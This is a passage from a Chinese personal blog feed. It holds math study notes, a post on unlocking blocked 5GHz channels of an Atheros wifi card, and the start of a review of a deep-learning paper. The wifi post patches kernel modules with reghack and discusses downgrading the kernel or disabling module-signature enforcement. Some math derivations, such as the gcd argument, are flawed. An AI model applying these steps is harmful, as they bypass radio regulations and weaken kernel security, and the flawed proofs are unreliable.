title="第一型曲面积分"></a>第一型曲面积分</h3><img src="/2021/06/14/%E6%95%B0%E5%AD%A6%E4%B8%80%E6%80%9D%E6%83%B3/2.jpg" class="" width="2"><p>其中面积微元dS的表达式计算方法为：<br>$$<br>dS=cos\theta dxdy<br>$$<br>其中$\theta$ 为当前曲面法线和z轴的夹角<br>$$<br>\overrightarrow{n}={-g_x,-g_y,1} , \overrightarrow{k}={ 0,0,1}\<br>\frac 1 {cos\theta} = \frac{|n||k|}{\overrightarrow{n}·\overrightarrow{k}}=\sqrt{1+g_x^2+g_y^2}<br>$$<br>得到关系带入即可</p><h1 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h1><p>我觉得线性代数是一门很讲究 <strong>构造</strong> 的学科，很多定理包括其本身都是为了解决描述问题而构造出来的</p><h3 id="A-AT"><a href="#A-AT" class="headerlink" title="|A| = |AT|"></a>|A| = |AT|</h3><p>简要来说 行列式的绝对值是行列式中不同行不同列元素的乘积，这种关系在转置后不会改变</p><p>他的正负由逆序数决定，同时逆序数也不会随着转置而发生改变（易证），比如： 12 ，24 是正序的，转置后 21 42 仍然正序， 13 ，22是逆序的，转置过后 22 ，31仍然是逆序的。</p><h4 id="行列式的某行-列-元素分别乘另一行-列-元素的代数余子式后再求和，结果为零"><a href="#行列式的某行-列-元素分别乘另一行-列-元素的代数余子式后再求和，结果为零" class="headerlink" title="行列式的某行(列)元素分别乘另一行(列)元素的代数余子式后再求和，结果为零"></a>行列式的某行(列)元素分别乘另一行(列)元素的代数余子式后再求和，结果为零</h4><p>相当于强行构造出线性相关(就是相等)的一行/列</p><h4 id="不平行向量可以表示任意"><a href="#不平行向量可以表示任意" class="headerlink" title="不平行向量可以表示任意"></a>不平行向量可以表示任意</h4><p>假设2*2的矩阵表示的，如果两个向量不成比例那么他们的线性组合可以表示二维平面任意向量<br>$$<br>{ 2x-y =a \<br>-x+2y = b }  =&gt; y= (a+2b)/3 \ 所以给定任意ab一定能求出y<br>$$</p><h4 id="秩"><a href="#秩" class="headerlink" title="秩"></a>秩</h4><p>矩阵的秩的概念，若存在k阶子式不为零，而任意k+1阶子式全为零，则r(A)=k</p><p>私己觉得主要的重点在于两点 </p><ul><li><p><strong>子式</strong>，即k阶行列式是否为零代表行列式中是否有线性相关的向量</p></li><li><p>存在：因为行列式是方的，防止从行上可能选的相关的向量0，从列上某些向量的一部分可能相关，但肯定有不相关的，所以用<strong>存在</strong>。而k+1 阶时，因为只有k个线性无关向量，必选到相关的，肯定为0</p></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p> 注：相关的意思为 向量集 中的一个向量能用其他向量线性表示 ，而非只是简单的成比例</p></blockquote><h3 id="为什么行秩-列秩"><a href="#为什么行秩-列秩" class="headerlink" title="为什么行秩=列秩"></a>为什么行秩=列秩</h3><h4 id="行与列"><a href="#行与列" class="headerlink" title="行与列"></a>行与列</h4><p>行列式的行与列，矩阵的行与列</p><h3 id="当-r-A-n-1-时-r-A-1-n为A的列"><a href="#当-r-A-n-1-时-r-A-1-n为A的列" class="headerlink" title="当 r(A) = n-1 时 r(A*) = 1 (n为A的列)"></a>当 r(A) = n-1 时 r(A*) = 1 (n为A的列)</h3><p>$$<br>\because r(A)=n-1<br>$$</p><h3 id="特征值和特征向量的对应关系"><a href="#特征值和特征向量的对应关系" class="headerlink" title="特征值和特征向量的对应关系"></a>特征值和特征向量的对应关系</h3><p>其实是一对一的，但是对应出的特征向量不一定是线性无关的，所以</p><p>k重特征值至多只有k个线性无关的特征向量</p><h3 id="特征值的性质及其证明"><a href="#特征值的性质及其证明" class="headerlink" title="特征值的性质及其证明"></a>特征值的性质及其证明</h3><p>$$<br>\sum^n_{i=1}\lambda_i = \sum^n_{i=1}a_{ii}; \\<br>\because \lambda^n 和 \lambda^{n-1}  均只能由对角线乘积的那一组得到 \\<br>且系数为\lambda^n+\sum^n_{i=1}a_{ii}\lambda^{n-1} \\<br>\prod_{i=1}^n\lambda_i=|A| \\<br>相似理论,不同行不同列乘积（且正负号两者相同）<br>$$</p><h3 id="求可逆矩阵使得相似对角化"><a href="#求可逆矩阵使得相似对角化" class="headerlink" title="求可逆矩阵使得相似对角化"></a>求可逆矩阵使得相似对角化</h3><p>$$<br>why , p=[\xi_1,\xi_2,…,\xi_n],则 P^{-1}AP=\Lambda 且对角元素为特征值 \\<br>\because p^{-1}=[\frac{\xi_1}{|\xi_1|^2},\frac{\xi_2}{|\xi_2|^2},…,\frac{\xi_n}{|\xi_n|^2}]^T \\<br>AP=[\lambda_1\xi_1,\lambda_2\xi_2,…,\lambda_n\xi_n] \\<br>易得 P^{-1}AP=\Lambda<br>$$</p><h1 id="概率论"><a href="#概率论" class="headerlink" title="概率论"></a>概率论</h1><h1 id="数论"><a href="#数论" class="headerlink" title="数论"></a>数论</h1><h3 id="gcd-a-b-max-k-k-a-amp-k-b"><a href="#gcd-a-b-max-k-k-a-amp-k-b" class="headerlink" title="gcd(a,b) = max [k , k|a &amp; k|b]"></a>gcd(a,b) = max [k , k|a &amp; k|b]</h3><p>$$<br>反证法：假设存在 q&lt;k,满足q|a且q|b \\ 那么(qk) 必满足(qk)|a且(qk)|n \\<br>k 就不是max了<br>$$</p>]]></content>
      
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改网卡地域限制</title>
      <link href="/2021/05/20/%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%9C%B0%E5%9F%9F%E9%99%90%E5%88%B6/"/>
      <url>/2021/05/20/%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%9C%B0%E5%9F%9F%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍了在构建路由器时为了破解地域限制的选路机制的相关工作、</p><a id="more"></a> <h1 id="破解网卡的-Regulatory-Domain"><a href="#破解网卡的-Regulatory-Domain" class="headerlink" title="破解网卡的 Regulatory Domain"></a>破解网卡的 Regulatory Domain</h1><p>我们网卡的 版本号</p><pre class="line-numbers language-none"><code class="language-none">Network controller: Qualcomm Atheros AR958x 802.11abgn Wireless Network Adapter (rev 01)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[TOC]</p><h2 id="利用-reghack-修改内核模块"><a href="#利用-reghack-修改内核模块" class="headerlink" title="利用 reghack 修改内核模块"></a>利用 reghack 修改内核模块</h2><blockquote><p>曾经的一个教程</p></blockquote><p>不同的国家和地区有不同的无线电管理规定(Regulatory Domain)，对于ISM 5GHz频段的划分也有不同的准则。</p><p>Regulatory Domian有3大族，以美国为代表的FCC，以欧盟为代表的ETSI，以及日本再一次特立独行的TELEC（无论在蜂窝网还是WLAN，日本一直都是个怪异的存在）。中国采用ETSI规定，具体频段管理与欧盟有所不同。</p><p>无线网卡驱动根据ISO-3166 alpha2规定的国家代码（如美国US，中国CN，德国DE，韩国KR，日本JP），对网卡的工作频率进行管理。</p><p>高通Atheros在网卡驱动的公共部分加入了Regulatory Doamin管理的功能。针对销往不同国家的网卡产品，通过直接在网卡芯片的可擦写存储器（EEPROM）中写入相应的国家代码，驱动工作时读取该代码并开启相应的工作频段。</p><p>由于项目的需求，我们买了几张Atheros 958x系列的无线网卡，支持2.4/5GHz双频段，但是很遗憾的是这批网卡5GHz的中间一段不被支持。国家代码可以通过下列命令察看。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">dmesg</span> <span class="token operator">|</span> <span class="token function">grep</span> ath$ iwlist chan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>尽管使用了iw工具来修改linux系统的Regulatory Domain管理部分的国家代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ iw reg <span class="token builtin class-name">set</span> US$ iw reg get$ iwlist chan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是由于EEPROM的限制，被屏蔽的频段总是无法开启。</p><p>为了开启尽可能多的5GHz频段，在没有直接修改EEPROM的方法的情况下，我只能修改破解驱动中关于频段管理的部分。Google 到<a href="https://github.com/Luminger/reghack">reghack及其源代码</a>，并进行重新编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@linux: gcc reghack.c -o reghack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有gcc 这样安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装的Ubuntu 12.04.4系统是linux 3.11内核，linux 3.7 内核开始加入了模块签名及验证机制。下面的破解过程虽然顺利进行，但重启之后破解的无线模块cfg80211.ko和ath.ko无法加载，网卡不能驱动。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@linux:/home/user<span class="token comment"># ./reghack /lib/modules/3.11.0-15-generic/kernel/net/wireless/cfg80211.ko </span>Patching @ 0x0004cf30: core world6 regdomain <span class="token keyword">in</span> cfg80211/reg.oroot@linux:/home/user<span class="token comment"># ./reghack /lib/modules/3.11.0-15-generic/kernel/drivers/net/wireless/ath/ath.ko </span>Patching @ 0x00002110: ath world regdomain with <span class="token number">5</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x000021a0: ath world regdomain with <span class="token number">4</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00002220: ath world regdomain with <span class="token number">3</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00002280: ath world regdomain with <span class="token number">3</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x000022e0: ath world regdomain with <span class="token number">4</span> rules <span class="token keyword">in</span> ath/regd.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="降回到linux-3-2内核"><a href="#降回到linux-3-2内核" class="headerlink" title="降回到linux 3.2内核"></a>降回到linux 3.2内核</h4><p>如果你的内核版本默认就是低于3.7内核，就无需进行此操作。内核版本察看命令 <code>uname -a</code>,使用如下命令 <code>sudo apt-get install linux-image</code> 将linux 3.2内核及源码等自动下载安装。重启选择<code>Prevous Linux Versions</code>进入，然后选择启用3.2内核。为了安全起见，先进行备份处理。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user@linux:~$ gcc reghack.c -o reghackuser@linux:~$ <span class="token function">sudo</span> <span class="token function">cp</span> /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko.backupuser@linux:~$ <span class="token function">sudo</span> <span class="token function">cp</span> /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko.backupuser@linux:~$ <span class="token function">sudo</span> ./reghack /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.koPatching @ 0x00001e10: ath world regdomain with <span class="token number">5</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00001e90: ath world regdomain with <span class="token number">4</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00001ef8: ath world regdomain with <span class="token number">3</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00001f48: ath world regdomain with <span class="token number">3</span> rules <span class="token keyword">in</span> ath/regd.oPatching @ 0x00001f98: ath world regdomain with <span class="token number">4</span> rules <span class="token keyword">in</span> ath/regd.ouser@linux:~$ <span class="token function">sudo</span> ./reghack /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.koPatching @ 0x00022c60: core world5 regdomain <span class="token keyword">in</span> cfg80211/reg.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>破解后的频段见如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wlan0     <span class="token number">32</span> channels <span class="token keyword">in</span> total<span class="token punctuation">;</span> available frequencies <span class="token builtin class-name">:</span>          Channel 01 <span class="token builtin class-name">:</span> <span class="token number">2.412</span> GHz          Channel 02 <span class="token builtin class-name">:</span> <span class="token number">2.417</span> GHz          Channel 03 <span class="token builtin class-name">:</span> <span class="token number">2.422</span> GHz          Channel 04 <span class="token builtin class-name">:</span> <span class="token number">2.427</span> GHz          Channel 05 <span class="token builtin class-name">:</span> <span class="token number">2.432</span> GHz          Channel 06 <span class="token builtin class-name">:</span> <span class="token number">2.437</span> GHz          Channel 07 <span class="token builtin class-name">:</span> <span class="token number">2.442</span> GHz          Channel 08 <span class="token builtin class-name">:</span> <span class="token number">2.447</span> GHz          Channel 09 <span class="token builtin class-name">:</span> <span class="token number">2.452</span> GHz          Channel <span class="token number">10</span> <span class="token builtin class-name">:</span> <span class="token number">2.457</span> GHz          Channel <span class="token number">11</span> <span class="token builtin class-name">:</span> <span class="token number">2.462</span> GHz          Channel <span class="token number">36</span> <span class="token builtin class-name">:</span> <span class="token number">5.18</span> GHz          Channel <span class="token number">40</span> <span class="token builtin class-name">:</span> <span class="token number">5.2</span> GHz          Channel <span class="token number">44</span> <span class="token builtin class-name">:</span> <span class="token number">5.22</span> GHz          Channel <span class="token number">48</span> <span class="token builtin class-name">:</span> <span class="token number">5.24</span> GHz          Channel <span class="token number">52</span> <span class="token builtin class-name">:</span> <span class="token number">5.26</span> GHz          Channel <span class="token number">56</span> <span class="token builtin class-name">:</span> <span class="token number">5.28</span> GHz          Channel <span class="token number">60</span> <span class="token builtin class-name">:</span> <span class="token number">5.3</span> GHz          Channel <span class="token number">64</span> <span class="token builtin class-name">:</span> <span class="token number">5.32</span> GHz          Channel <span class="token number">100</span> <span class="token builtin class-name">:</span> <span class="token number">5.5</span> GHz          Channel <span class="token number">104</span> <span class="token builtin class-name">:</span> <span class="token number">5.52</span> GHz          Channel <span class="token number">108</span> <span class="token builtin class-name">:</span> <span class="token number">5.54</span> GHz          Channel <span class="token number">112</span> <span class="token builtin class-name">:</span> <span class="token number">5.56</span> GHz          Channel <span class="token number">116</span> <span class="token builtin class-name">:</span> <span class="token number">5.58</span> GHz          Channel <span class="token number">132</span> <span class="token builtin class-name">:</span> <span class="token number">5.66</span> GHz          Channel <span class="token number">136</span> <span class="token builtin class-name">:</span> <span class="token number">5.68</span> GHz          Channel <span class="token number">140</span> <span class="token builtin class-name">:</span> <span class="token number">5.7</span> GHz          Channel <span class="token number">149</span> <span class="token builtin class-name">:</span> <span class="token number">5.745</span> GHz          Channel <span class="token number">153</span> <span class="token builtin class-name">:</span> <span class="token number">5.765</span> GHz          Channel <span class="token number">157</span> <span class="token builtin class-name">:</span> <span class="token number">5.785</span> GHz          Channel <span class="token number">161</span> <span class="token builtin class-name">:</span> <span class="token number">5.805</span> GHz          Channel <span class="token number">165</span> <span class="token builtin class-name">:</span> <span class="token number">5.825</span> GHz          Current Frequency:2.437 GHz <span class="token punctuation">(</span>Channel <span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h2><p>linux内核从3.7 开始加入模块签名检查机制，如果内核选项CONFIG_MODULE_SIG和CONFIG_MODULE_SIG_FORCE打开的话，当加载模块时内核会检查模块的签名，如果签名不存在或者签名内容不一致，会强制退出模块的加载。所以为模块签名就尤为重要。如果是内核选项CONFIG_MODULE_SIG_ALL打开，内核编译模块时会自动为模块签名。否则就要自己对模块签名。</p><p>首先我们就要想到用什么签名工具，因为签名机制从3.7 内核才加入，所以为模块签名的资料少之又少，我找了很长时间也没有头绪，网上说的最多的都是openssl来做签名。所以理所当然的我也使用openssl来做签名，但是它是linux内核之外的工具，就算生成签名，你还要手动添加到模块.ko文件最后，还要设置一些内核要检查的固定结构体(例如：signature_module结构)，很是麻烦，并且内核的key你拿不到，用的不是内核的可以签名肯定通不过检查。所以这种方法至少我认为不可行。</p><p>有一篇英文资料比较好</p><h3 id="Signed-kernel-module-support"><a href="#Signed-kernel-module-support" class="headerlink" title="Signed kernel module support"></a>Signed kernel module support</h3><p>From Gentoo Wiki</p><p>Jump to: <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#mw-navigation">navigation</a>, <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#p-search">search</a></p><p>Since Linux kernel version 3.7 onwards, support has been added for signed kernel modules. When enabled, the Linux kernel will only load kernel modules that are digitally signed with the proper key. This allows further hardening of the system by disallowing unsigned kernel modules, or kernel modules signed with the wrong key, to be loaded. Malicious kernel modules are a common method for loading rootkits on a Linux system.</p><p>Contents [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">hide</a>] <a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Enabling_module_signature_verification">1 Enabling module signature verification</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Configuring_module_signature_verification">1.1 Configuring module signature verification</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Building_the_kernel_with_proper_keys">1.2 Building the kernel with proper keys</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Validating_module_signature_support">1.3 Validating module signature support</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Administering_kernel_module_signatures">2 Administering kernel module signatures</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Protecting_the_private_key">2.1 Protecting the private key</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Manually_signing_modules">2.2 Manually signing modules</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#Distributing_the_kernel_and_modules">2.3 Distributing the kernel and modules</a><a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#More_resources">3 More resources</a></p><h3 id="Enabling-module-signature-verification"><a href="#Enabling-module-signature-verification" class="headerlink" title="Enabling module signature verification"></a>Enabling module signature verification</h3><p>Enabling support is a matter of toggling a few settings in the Linux kernel configuration. Unless you want to use your own keypair, this is all that has to be done to enable kernel module support.</p><h4 id="Configuring-module-signature-verification"><a href="#Configuring-module-signature-verification" class="headerlink" title="Configuring module signature verification"></a>Configuring module signature verification</h4><p>Module signature verification is a kernel feature, so has to be enabled through the Linux kernel configuration. You can find the necessary options under Enable loadable module support.</p><p> [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">Collapse</a>] </p><p>Kernel configuration Enable module signature verification</p><pre class="line-numbers language-none"><code class="language-none">--- Enable loadable module support[*]   Module signature verification[*]     Require modules to be validly signed[*]     Automatically sign all modules      Which hash algorithm should modules be signed with? (Sign modules with SHA-512) ---&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The option Module signature verification (CONFIG_MODULE_SIG) enables the module signature verification in the Linux kernel. It supports two approaches on signed module support: a rather permissive one and a strict one. By default, the permissive approach is used, which means that the Linux kernel module either has to have a valid signature, or no signature. With the strict approach, a valid signature must be present. In the above example, the strict approach is used by selecting Require modules to be validly signed (CONFIG_MODULE_SIG_FORCE). Another way of enabling this strict approach is to set the kernel boot option enforcemodulesig=1.</p><p>When building the Linux kernel, the kernel modules will not be signed automatically unless you select Automatically sign all modules(CONFIG_MODULE_SIG_ALL).</p><p>Finally, we need to select the hash algorithm to use with the cryptographic signature. In the above example, we use SHA-512.</p><h4 id="Building-the-kernel-with-proper-keys"><a href="#Building-the-kernel-with-proper-keys" class="headerlink" title="Building the kernel with proper keys"></a>Building the kernel with proper keys</h4><p>When the Linux kernel is building with module signature verification support enabled, then you can use your own keys or have the Linux kernel build infrastructure create a set for you. If you want the Linux kernel build infrastructure to create it for you, just continue as you always do with a make and make modules_install. At the end of the build process, you will notice that signing_key.priv and signing_key.x509 will be available on the root of the Linux kernel sources.</p><p>If we want to use our own keys, you can use openssl to create a key pair (private key and public key). The following command, taken from kernel/Makefile, creates such a key pair.</p><p> [<a href="http://wiki.gentoo.org/wiki/Signed_kernel_module_support#">Collapse</a>] </p><p>File x509.genkey Key generation configuration file</p><pre class="line-numbers language-none"><code class="language-none">[ req ]default_bits &#x3D; 4096distinguished_name &#x3D; req_distinguished_nameprompt &#x3D; nostring_mask &#x3D; utf8onlyx509_extensions &#x3D; myexts  [ req_distinguished_name ]O &#x3D; GenFicCN &#x3D; Kernel Signing KeyemailAddress &#x3D; server.support@genfic.com  [ myexts ]basicConstraints&#x3D;critical,CA:FALSEkeyUsage&#x3D;digitalSignaturesubjectKeyIdentifier&#x3D;hashauthorityKeyIdentifier&#x3D;keyid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>user $</strong> openssl req -new -nodes -utf8 -sha512 -days 36500 -batch -x509 -config x509.genkey -outform DER -out signing_key.x509 -keyout signing_key.priv</p><p>The resulting files need to be stored as signing_key.x509 and signing_key.priv in the root of the Linux kernel source tree.</p><p>The public key part will be build inside the Linux kernel. If you configured the kernel to sign modules, this signing will take place during the make modules_install part.</p><h4 id="Validating-module-signature-support"><a href="#Validating-module-signature-support" class="headerlink" title="Validating module signature support"></a>Validating module signature support</h4><p>Reboot with the newly configured kernel. In the output of dmesg you should be able to confirm that the proper certificate is loaded:</p><p><strong>user $</strong> dmesg | grep MODSIGN</p><hr><pre class="line-numbers language-none"><code class="language-none">[    2.450021] MODSIGN: Loaded cert &#39;GenFic: Kernel Signing Key: b923a5f44eae25bbad52c8bf2742e7b7e6fb0c0e&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The kernel modules have the digital signature appended at the end. A simple hexdump can confirm if a signature is present or not:</p><p><strong>user $</strong> hexdump -C vxlan.ko | tail</p><hr><pre class="line-numbers language-none"><code class="language-none">00008880  cf 0e e7 cb 10 9e 98 5f  4b 21 d4 03 ba 3d 7e e7  |......._K!...&#x3D;~.|00008890  68 db f9 e3 5f 62 3c c7  d6 6c 84 c7 d6 68 c1 73  |h..._b&lt;..l...h.s|000088a0  3d d7 5a 38 66 99 12 b8  84 c9 84 45 dd 68 6d 17  |&#x3D;.Z8f......E.hm.|000088b0  03 24 dc 9c 6f 6d 11 01  e9 74 82 ea b5 5b 46 07  |.$..om...t...[F.|000088c0  fe dd 66 97 1a 33 58 3d  6e d0 ac 03 08 16 73 06  |..f..3X&#x3D;n.....s.|000088d0  9f 90 c4 eb b3 82 1d 9f  48 8c 5b 51 01 06 01 1e  |........H.[Q....|000088e0  14 00 00 00 00 00 02 02  7e 4d 6f 64 75 6c 65 20  |........~Module |000088f0  73 69 67 6e 61 74 75 72  65 20 61 70 70 65 6e 64  |signature append|00008900  65 64 7e 0a                                       |ed~.|00008904<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The string <del>Module signature appended</del> at the end confirms that a signature is present. Of course, it does not confirm that the signature is valid or not.</p><p>To remove the signature, we can use the strip command:</p><p><strong>root #</strong> strip –strip-debug vxlan.ko<br><strong>root #</strong> hexdump -C vxlan.ko | tail</p><hr><pre class="line-numbers language-none"><code class="language-none">00097330  6c 5f 67 65 74 5f 73 74  61 74 73 36 34 00 72 63  |l_get_stats64.rc|00097340  75 5f 62 61 72 72 69 65  72 00 5f 72 61 77 5f 73  |u_barrier._raw_s|00097350  70 69 6e 5f 75 6e 6c 6f  63 6b 00 72 65 67 69 73  |pin_unlock.regis|00097360  74 65 72 5f 70 65 72 6e  65 74 5f 64 65 76 69 63  |ter_pernet_devic|00097370  65 00 6b 6d 61 6c 6c 6f  63 5f 63 61 63 68 65 73  |e.kmalloc_caches|00097380  00 6e 65 74 64 65 76 5f  69 6e 66 6f 00 6e 65 69  |.netdev_info.nei|00097390  67 68 5f 6c 6f 6f 6b 75  70 00 72 65 6c 65 61 73  |gh_lookup.releas|000973a0  65 5f 73 6f 63 6b 00 72  65 67 69 73 74 65 72 5f  |e_sock.register_|000973b0  6e 65 74 64 65 76 69 63  65 00                    |netdevice.|000973ba<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If we try to load this module now, we get a failure:</p><p><strong>root #</strong> modprobe vxlan</p><hr><pre class="line-numbers language-none"><code class="language-none">modprobe: ERROR: could not insert &#39;vxlan&#39;: Required key not available<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This confirms that modules without a signature are not loaded.</p><h3 id="Administering-kernel-module-signatures"><a href="#Administering-kernel-module-signatures" class="headerlink" title="Administering kernel module signatures"></a>Administering kernel module signatures</h3><p>Once the kernel boots and we have validated that the signed kernel module support works, it is important to correctly handle the keys themselves.</p><h4 id="Protecting-the-private-key"><a href="#Protecting-the-private-key" class="headerlink" title="Protecting the private key"></a>Protecting the private key</h4><p>The private key, stored as signing_key.priv, needs to be moved to a secure location (unless you will be creating new keys for new kernels, in which case the file can be removed). Do not keep it at /usr/src/linux on production systems as malware can then easily use this key to sign the malicious kernel modules (such as rootkits) and compromise the system further.</p><h4 id="Manually-signing-modules"><a href="#Manually-signing-modules" class="headerlink" title="Manually signing modules"></a>Manually signing modules</h4><p>If you ever need to manually sign a kernel module, you can use the scripts/sign-file script available in the Linux kernel source tree. It requires four arguments:</p><ol><li>The hash algorithm to use, such as sha512</li><li>The private key location</li><li>The certificate (which includes the public key) location</li><li>The kernel module to sign</li></ol><p>In this case, the key pair does not need to be named signing_file.priv and such, nor do they need to be in the root of the Linux kernel source tree location.</p><p><strong>user $</strong> perl /usr/src/linux/scripts/sign-file sha512 /mnt/sdcard/kernel-signkey.priv /mnt/sdcard/kernel-signkey.x509 vxlan.ko</p><h4 id="Distributing-the-kernel-and-modules"><a href="#Distributing-the-kernel-and-modules" class="headerlink" title="Distributing the kernel and modules"></a>Distributing the kernel and modules</h4><p>If we create a kernel package through make tarbz2-pkg, the modules in it will be signed already so we do not need to manually sign them afterwards. The signing keys themselves are not distributed with it.</p><h4 id="More-resources"><a href="#More-resources" class="headerlink" title="More resources"></a>More resources</h4><p>In <a href="http://www.kroah.com/log/blog/2013/09/02/booting-a-self-signed-linux-kernel/">Booting a self-signed Linux kernel</a> Greg Kroah-Hartman describes how to boot a self-signed Linux kernel from EFI. As having signed kernel module support is only secure if the Linux kernel is trusted, this is an important (and related) feature to work with.</p><p>一个关闭签名的案例：</p><p><img src="https://img-blog.csdn.net/20170308151344817?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZWxpb3Rfc2hhbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3 id="面临的问题"><a href="#面临的问题" class="headerlink" title="面临的问题"></a>面临的问题</h3><p>成功率不能保证</p><p>老版本的reghack不确定对新版本的内核模块有用，可能需要了解修改的原理</p><p>内核编译时需要关闭密钥验证机制，是否对安全性有影响</p><h2 id="新的-Reghack"><a href="#新的-Reghack" class="headerlink" title="新的 Reghack"></a>新的 Reghack</h2><p>该方法优点是看起来十分的清晰全面，感觉成功率有保证，缺点是有针对性的是针对wdr4310v1，但高兴的是该路由器的wireless硬件就是Atheros AR9580,<strong>可能</strong>就是一样的，但还是需要自己的<strong>ART</strong> file，且他是基于AR9300的，且LEDE-openwrt好像不支持我们这个硬件。</p><p><a href="https://github.com/tete1030/reghack">仓库地址</a></p><h2 id="更改EEPROM"><a href="#更改EEPROM" class="headerlink" title="更改EEPROM"></a>更改EEPROM</h2><p>利用 <a href="https://github.com/rsa9000/atheepmgr">atheepmgr</a> 查看EEPROM在linux编译的时候设置了权限 没有办法dump和更改。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WIFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>privacy-preserving deep-learning via weight Transmission</title>
      <link href="/2021/03/20/Transmission/"/>
      <url>/2021/03/20/Transmission/</url>
      
        <content type="html"><![CDATA[<p>本文针对《Privacy-Preserving Deep Learning via Weight Transmission》该篇论文进行了分析</p><p>比较全面 </p><a id="more"></a><h3 id="论文题目理解"><a href="#论文题目理解" class="headerlink" title="论文题目理解"></a>论文题目理解</h3><p>本文设立了一个能保护隐私的深度学习算法，根据本文的内容，我将原题目《Privacy-Preserving Deep Learning via Weight Transmission》扩展为《Privacy-preserving SGD for distributed trainers via weight transmission》即通过权重传输实现的针对分布式训练者的隐私保护随机梯度下降算法，通过对题目的分析，我们知道本文的书写环境和目的如下：</p><ul><li><p>算法 ：SGD 随机梯度下降</p></li><li><p>目的 ：隐私保护</p></li><li><p>环境 ：分布式神经网路 &amp; 深度学习</p></li></ul><h3 id="论文背景知识"><a href="#论文背景知识" class="headerlink" title="论文背景知识"></a>论文背景知识</h3><h4 id="背景知识一："><a href="#背景知识一：" class="headerlink" title="背景知识一："></a>背景知识一：</h4><p>本文是在SGD随机梯度下降算法的基础上进行改进和扩展的。为了介绍SGD，我们首先介绍一下GD最速梯度下降算法-Gradient Descent，该算法是通过计算给定数据集的导数，使函数不断收敛至J函数-cost function的最小值，得到结果，该方法的具体数学公式为<br>$$<br>x_{t+1} = x_t - \eta_t\nabla f(x_t)<br>$$<br>其中$\eta_t$为步长，  为$\nabla f(x_t)$导数，该方法有两个缺点：</p><ol><li>为了保证准确性$\nabla 